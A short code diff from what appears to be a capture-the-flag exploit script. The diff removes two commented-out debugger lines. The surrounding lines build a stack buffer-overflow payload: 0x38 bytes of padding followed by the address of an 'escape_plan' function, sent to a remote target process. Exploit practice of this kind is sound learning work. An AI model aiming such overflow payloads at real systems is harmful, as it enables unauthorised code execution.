@@ -21,8 +21,6 @@ if __name__ == '__main__':
         detect_libc=True
     )
     t = TargetBase(config=remote_config)
-    # _, debugger = gdb.attach(t.process.pid, api=True)
-    # debugger.execute('c')
     address = t.file.symbols['escape_plan']
     t.process.sendline(b'069')
     payload = b'A' * 0x38 + p64(address)
